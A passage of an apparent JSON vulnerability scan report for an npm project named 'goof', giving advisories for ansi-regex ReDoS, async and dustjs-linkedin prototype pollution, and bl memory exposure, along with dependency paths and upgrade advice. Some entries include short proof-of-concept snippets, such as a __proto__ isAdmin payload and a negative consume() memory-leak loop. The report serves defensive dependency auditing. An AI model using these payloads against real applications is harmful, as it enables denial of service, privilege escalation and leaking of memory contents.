then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\\n- `D` Finally, we ensure this section of the string ends with a 'D'\\n\\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\\n\\nIt most cases, it doesn't take very long for a regex engine to find a match:\\n\\n```bash\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\\\")'\\n0.04s user 0.01s system 95% cpu 0.052 total\\n\\n$ time node -e '/A(B|C+)+D/.test(\\\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\\\")'\\n1.79s user 0.02s system 99% cpu 1.812 total\\n```\\n\\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\\n\\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\\n\\nLet's look at how our expression runs into this problem, using a shorter string: \\\"ACCCX\\\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\\n1. CCC\\n2. CC+C\\n3. C+CC\\n4. C+C+C.\\n\\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\\n\\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\\n\\n| String | Number of C's | Number of steps |\\n| -------|-------------:| -----:|\\n| ACCCX | 3 | 38\\n| ACCCCX | 4 | 71\\n| ACCCCCX | 5 | 136\\n| ACCCCCCCCCCCCCCX | 14 | 65,553\\n\\n\\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\\n\\n## Remediation\\nUpgrade `ansi-regex` to version 6.0.1, 5.0.1 or higher.\\n## References\\n- [GitHub Commit](https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9)\\n- [GitHub PR](https://github.com/chalk/ansi-regex/pull/37)\\n\",\n  \"disclosureTime\": \"2021-09-09T14:27:43Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"6.0.1\",\n    \"5.0.1\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-ANSIREGEX-1583908\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-3807\"\n    ],\n    \"CWE\": [\n      \"CWE-400\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-03-15T13:49:53.043116Z\",\n  \"moduleName\": \"ansi-regex\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"ansi-regex\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2021-09-12T12:52:37Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/chalk/ansi-regex/commit/8d1d7cdb586269882c4bdc1b7325d0c58c8f76f9\"\n    },\n    {\n      \"title\": \"GitHub PR\",\n      \"url\": \"https://github.com/chalk/ansi-regex/pull/37\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=6.0.0 <6.0.1\",\n      \">2.1.1 <5.0.1\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Regular Expression Denial of Service (ReDoS)\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"tap@11.1.5\",\n    \"nyc@11.9.0\",\n    \"yargs@11.1.0\",\n    \"string-width@2.1.1\",\n    \"strip-ansi@4.0.0\",\n    \"ansi-regex@3.0.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"tap@15.0.0\",\n    \"nyc@15.1.0\",\n    \"yargs@15.0.2\",\n    \"string-width@4.2.0\",\n    \"strip-ansi@6.0.0\",\n    \"ansi-regex@5.0.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"ansi-regex\",\n  \"version\": \"3.0.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , string-width@2.1.1 , strip-ansi@4.0.0 , ansi-regex@3.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , cliui@4.1.0 , strip-ansi@4.0.0 , ansi-regex@3.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , yargs@11.1.0 , cliui@4.1.0 , string-width@2.1.1 , strip-ansi@4.0.0 , ansi-regex@3.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , string-width@4.2.0 , strip-ansi@6.0.0 , ansi-regex@5.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , cliui@6.0.0 , strip-ansi@6.0.0 , ansi-regex@5.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , cliui@6.0.0 , string-width@4.2.0 , strip-ansi@6.0.0 , ansi-regex@5.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , cliui@6.0.0 , wrap-ansi@6.2.0 , strip-ansi@6.0.0 , ansi-regex@5.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , cli-highlight@2.1.4 , yargs@15.4.1 , cliui@6.0.0 , wrap-ansi@6.2.0 , string-width@4.2.0 , strip-ansi@6.0.0 , ansi-regex@5.0.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , string-width@3.1.0 , strip-ansi@5.2.0 , ansi-regex@4.1.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , cliui@5.0.0 , strip-ansi@5.2.0 , ansi-regex@4.1.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , cliui@5.0.0 , string-width@3.1.0 , strip-ansi@5.2.0 , ansi-regex@4.1.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , cliui@5.0.0 , wrap-ansi@5.1.0 , strip-ansi@5.2.0 , ansi-regex@4.1.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , typeorm@0.2.24 , yargs@13.3.2 , cliui@5.0.0 , wrap-ansi@5.1.0 , string-width@3.1.0 , strip-ansi@5.2.0 , ansi-regex@4.1.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [
              "2021-43138"
            ],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-ASYNC-2441827",
          "desc": "## Overview\n\nAffected versions of this package are vulnerable to Prototype Pollution via the `mapValues()` method.\r\n\r\n## PoC\r\n\r\n```js\r\n//when objects are parsed, all properties are created as own (the objects can come from outside sources (http requests/ file))\r\nconst hasOwn = JSON.parse('{\"__proto__\": {\"isAdmin\": true}}');\r\n\r\n//does not have the property,  because it's inside object's own \"__proto__\"\r\nconsole.log(hasOwn.isAdmin);\r\n\r\nasync.mapValues(hasOwn, (val, key, cb) => cb(null, val), (error, result) => {\r\n  // after the method executes, hasOwn.__proto__ value (isAdmin: true) replaces the prototype of the newly created object, leading to potential exploits.\r\n  console.log(result.isAdmin);\r\n});\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `async` to version 3.2.2 or higher.\n## References\n- [GitHub Backport PR](https://github.com/caolan/async/pull/1828)\n- [GitHub Commit](https://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d)\n- [PoC](https://jsfiddle.net/oz5twjd9/)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2022-04-07T07:58:38.528444Z\",\n  \"credit\": [\n    \"Unknown\"\n  ],\n  \"cvssScore\": 7.5,\n  \"description\": \"## Overview\\n\\nAffected versions of this package are vulnerable to Prototype Pollution via the `mapValues()` method.\\r\\n\\r\\n## PoC\\r\\n\\r\\n```js\\r\\n//when objects are parsed, all properties are created as own (the objects can come from outside sources (http requests/ file))\\r\\nconst hasOwn = JSON.parse('{\\\"__proto__\\\": {\\\"isAdmin\\\": true}}');\\r\\n\\r\\n//does not have the property,  because it's inside object's own \\\"__proto__\\\"\\r\\nconsole.log(hasOwn.isAdmin);\\r\\n\\r\\nasync.mapValues(hasOwn, (val, key, cb) => cb(null, val), (error, result) => {\\r\\n  // after the method executes, hasOwn.__proto__ value (isAdmin: true) replaces the prototype of the newly created object, leading to potential exploits.\\r\\n  console.log(result.isAdmin);\\r\\n});\\r\\n```\\n\\n## Details\\n\\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\\n\\nThere are two main ways in which the pollution of prototypes occurs:\\n\\n-   Unsafe `Object` recursive merge\\n    \\n-   Property definition by path\\n    \\n\\n### Unsafe Object recursive merge\\n\\nThe logic of a vulnerable recursive merge function follows the following high-level model:\\n```\\nmerge (target, source)\\n\\n  foreach property of source\\n\\n    if property exists and is an object on both the target and the source\\n\\n      merge(target[property], source[property])\\n\\n    else\\n\\n      target[property] = source[property]\\n```\\n<br>  \\n\\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\\n\\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\\n\\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\\n\\n### Property definition by path\\n\\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\\n\\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\\n\\n## Types of attacks\\n\\nThere are a few methods by which Prototype Pollution can be manipulated:\\n\\n| Type |Origin  |Short description |\\n|--|--|--|\\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\\n\\n## Affected environments\\n\\nThe following environments are susceptible to a Prototype Pollution attack:\\n\\n-   Application server\\n    \\n-   Web server\\n    \\n\\n## How to prevent\\n\\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\\n    \\n2.  Require schema validation of JSON input.\\n    \\n3.  Avoid using unsafe recursive merge functions.\\n    \\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\\n    \\n5.  As a best practice use `Map` instead of `Object`.\\n\\n### For more information on this vulnerability type:\\n\\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\\n\\n## Remediation\\nUpgrade `async` to version 3.2.2 or higher.\\n## References\\n- [GitHub Backport PR](https://github.com/caolan/async/pull/1828)\\n- [GitHub Commit](https://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d)\\n- [PoC](https://jsfiddle.net/oz5twjd9/)\\n\",\n  \"disclosureTime\": \"2022-04-07T07:49:24Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"3.2.2\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-ASYNC-2441827\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2021-43138\"\n    ],\n    \"CWE\": [\n      \"CWE-1321\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2022-04-13T14:03:13.098892Z\",\n  \"moduleName\": \"async\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"async\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2022-04-07T14:22:18Z\",\n  \"references\": [\n    {\n      \"title\": \"GitHub Backport PR\",\n      \"url\": \"https://github.com/caolan/async/pull/1828\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/caolan/async/commit/e1ecdbf79264f9ab488c7799f4c76996d5dca66d\"\n    },\n    {\n      \"title\": \"PoC\",\n      \"url\": \"https://jsfiddle.net/oz5twjd9/\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \"<3.2.2\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Prototype Pollution\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"hbs@4.0.4\",\n    \"handlebars@4.0.14\",\n    \"async@2.6.3\"\n  ],\n  \"upgradePath\": [],\n  \"isUpgradable\": false,\n  \"isPatchable\": false,\n  \"name\": \"async\",\n  \"version\": \"2.6.3\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , hbs@4.0.4 , handlebars@4.0.14 , async@2.6.3 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongoose@4.2.4 , async@0.9.0 ]",
              "run_time": 0,
              "start_time": ""
            },
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , tap@11.1.5 , nyc@11.9.0 , istanbul-reports@1.4.0 , handlebars@4.0.11 , async@1.5.2 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-000213"
            ],
            "nist": [
              "AC-3"
            ],
            "cweid": [
              "9"
            ],
            "cveid": [
              "2020-8244"
            ],
            "ghsaid": [
              "pp7h-53gx-mx7r"
            ]
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Remote Memory Exposure",
          "id": "SNYK-JS-BL-608877",
          "desc": "## Overview\n[bl](https://github.com/rvagg/bl) is a library that allows you to collect buffers and access with a standard readable buffer interface.\n\nAffected versions of this package are vulnerable to Remote Memory Exposure. If user input ends up in `consume()` argument and can become negative, BufferList state can be corrupted, tricking it into exposing uninitialized memory via regular `.slice()` calls.\r\n\r\n### PoC by chalker\r\n```\r\nconst { BufferList } = require('bl')\r\nconst secret = require('crypto').randomBytes(256)\r\nfor (let i = 0; i < 1e6; i++) {\r\n  const clone = Buffer.from(secret)\r\n  const bl = new BufferList()\r\n  bl.append(Buffer.from('a'))\r\n  bl.consume(-1024)\r\n  const buf = bl.slice(1)\r\n  if (buf.indexOf(clone) !== -1) {\r\n    console.error(`Match (at ${i})`, buf)\r\n  }\r\n}\r\n```\n## Remediation\nUpgrade `bl` to version 2.2.1, 3.0.1, 4.0.3, 1.2.3 or higher.\n## References\n- [Github Commit](https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e)\n- [Github Commit](https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190)\n- [Github Commit](https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466)\n- [GitHub Commit](https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00)\n- [HackerOne Report](https://hackerone.com/reports/966347)\n",
          "impact": 0.7,
          "code": "{\n  \"CVSSv3\": \"CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:L/A:L/E:P\",\n  \"alternativeIds\": [],\n  \"creationTime\": \"2020-08-28T12:18:44.906258Z\",\n  \"credit\": [\n    \"chalker\"\n  ],\n  \"cvssScore\": 7.7,\n  \"description\": \"## Overview\\n[bl](https://github.com/rvagg/bl) is a library that allows you to collect buffers and access with a standard readable buffer interface.\\n\\nAffected versions of this package are vulnerable to Remote Memory Exposure. If user input ends up in `consume()` argument and can become negative, BufferList state can be corrupted, tricking it into exposing uninitialized memory via regular `.slice()` calls.\\r\\n\\r\\n### PoC by chalker\\r\\n```\\r\\nconst { BufferList } = require('bl')\\r\\nconst secret = require('crypto').randomBytes(256)\\r\\nfor (let i = 0; i < 1e6; i++) {\\r\\n  const clone = Buffer.from(secret)\\r\\n  const bl = new BufferList()\\r\\n  bl.append(Buffer.from('a'))\\r\\n  bl.consume(-1024)\\r\\n  const buf = bl.slice(1)\\r\\n  if (buf.indexOf(clone) !== -1) {\\r\\n    console.error(`Match (at ${i})`, buf)\\r\\n  }\\r\\n}\\r\\n```\\n## Remediation\\nUpgrade `bl` to version 2.2.1, 3.0.1, 4.0.3, 1.2.3 or higher.\\n## References\\n- [Github Commit](https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e)\\n- [Github Commit](https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190)\\n- [Github Commit](https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466)\\n- [GitHub Commit](https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00)\\n- [HackerOne Report](https://hackerone.com/reports/966347)\\n\",\n  \"disclosureTime\": \"2020-08-27T15:16:42Z\",\n  \"exploit\": \"Proof of Concept\",\n  \"fixedIn\": [\n    \"2.2.1\",\n    \"3.0.1\",\n    \"4.0.3\",\n    \"1.2.3\"\n  ],\n  \"functions\": [],\n  \"functions_new\": [],\n  \"id\": \"SNYK-JS-BL-608877\",\n  \"identifiers\": {\n    \"CVE\": [\n      \"CVE-2020-8244\"\n    ],\n    \"CWE\": [\n      \"CWE-9\"\n    ],\n    \"GHSA\": [\n      \"GHSA-pp7h-53gx-mx7r\"\n    ],\n    \"NSP\": [\n      \"1555\"\n    ]\n  },\n  \"language\": \"js\",\n  \"malicious\": false,\n  \"modificationTime\": \"2021-08-08T13:56:54.899052Z\",\n  \"moduleName\": \"bl\",\n  \"packageManager\": \"npm\",\n  \"packageName\": \"bl\",\n  \"patches\": [],\n  \"proprietary\": false,\n  \"publicationTime\": \"2020-08-28T12:18:48Z\",\n  \"references\": [\n    {\n      \"title\": \"Github Commit\",\n      \"url\": \"https://github.com/rvagg/bl/commit/8a8c13c880e2bef519133ea43e0e9b78b5d0c91e\"\n    },\n    {\n      \"title\": \"Github Commit\",\n      \"url\": \"https://github.com/rvagg/bl/commit/d3e240e3b8ba4048d3c76ef5fb9dd1f8872d3190\"\n    },\n    {\n      \"title\": \"Github Commit\",\n      \"url\": \"https://github.com/rvagg/bl/commit/dacc4ac7d5fcd6201bcf26fbd886951be9537466\"\n    },\n    {\n      \"title\": \"GitHub Commit\",\n      \"url\": \"https://github.com/rvagg/bl/commit/0bd87ec97be399b129fc62feff2943ffa21bcc00\"\n    },\n    {\n      \"title\": \"HackerOne Report\",\n      \"url\": \"https://hackerone.com/reports/966347\"\n    }\n  ],\n  \"semver\": {\n    \"vulnerable\": [\n      \">=2.2.0 <2.2.1\",\n      \">=3.0.0 <3.0.1\",\n      \">=4.0.0 <4.0.3\",\n      \"<1.2.3\"\n    ]\n  },\n  \"severity\": \"high\",\n  \"socialTrendAlert\": false,\n  \"title\": \"Remote Memory Exposure\",\n  \"severityWithCritical\": \"high\",\n  \"from\": [\n    \"goof@1.0.1\",\n    \"mongodb@3.5.9\",\n    \"bl@2.2.0\"\n  ],\n  \"upgradePath\": [\n    false,\n    \"mongodb@3.5.9\",\n    \"bl@2.2.1\"\n  ],\n  \"isUpgradable\": true,\n  \"isPatchable\": false,\n  \"name\": \"bl\",\n  \"version\": \"2.2.0\"\n}",
          "results": [
            {
              "status": "failed",
              "code_desc": "From : [ goof@1.0.1 , mongodb@3.5.9 , bl@2.2.0 ]",
              "run_time": 0,
              "start_time": ""
            }
          ]
        },
        {
          "tags": {
            "cci": [
              "CCI-003173",
              "CCI-001643"
            ],
            "nist": [
              "SA-11",
              "RA-5"
            ],
            "cweid": [
              "1321"
            ],
            "cveid": [],
            "ghsaid": []
          },
          "descriptions": [],
          "refs": [],
          "source_location": {},
          "title": "Prototype Pollution",
          "id": "SNYK-JS-DUSTJSLINKEDIN-1089257",
          "desc": "## Overview\n[dustjs-linkedin](https://www.npmjs.com/package/dustjs-linkedin) is a Javascript templating engine designed to run asynchronously on both the server and the browser.\n\nAffected versions of this package are vulnerable to Prototype Pollution. It is possible to pollute the `blocks` Array attribute of the object `context` within the `compileBlocks` function. This vulnerability can be leveraged for code execution since  this property is added to the `compiled` function which is then execute by the `vm` module.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n    \n\n## How to prevent\n\n1.  